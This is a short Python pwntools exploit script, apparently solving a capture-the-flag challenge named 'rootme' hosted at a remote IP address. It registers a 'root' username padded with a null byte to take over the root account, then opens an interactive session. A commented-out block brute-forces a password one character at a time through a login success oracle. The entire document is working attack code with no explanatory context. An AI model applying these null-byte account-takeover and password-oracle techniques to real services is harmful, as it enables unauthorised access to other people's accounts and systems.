from pwn import *


def Del(index):
        r.recvuntil("Choice: ")
        r.send('4\x00')
        r.recvuntil("User's ID: ")
        r.send(str(index))

def Reg(user, pw):
        r.recvuntil("Choice: ")
        r.send('1\x00')
        r.recvuntil('Enter username: ')
        r.send(user)
        r.recvuntil("Enter password: ")
        r.send(pw)

def Login(user, pw):
        r.recvuntil("Choice: ")
        r.send('2\x00')
        r.recvuntil("Username: ")
        r.send(user)
        r.recvuntil("Password: ")
        r.send(pw)
        return r.recvline()

#r = process('./rootme')
r = remote("125.235.240.168", 27018)

password = "PasswordIsVeryHardToGuessssss"
#Del(9)
Reg("root\x00", password+"\x00")
Login("root\x00", password+"\x00")
r.interactive()
"""Brute force password :v
Reg("xxx\x00", payload)
for i in range(0x20, 0x7f):
        if "Access Granted" in Login("xxx\x00", payload+chr(i)+password):
                print i, chr(i)
                break
"""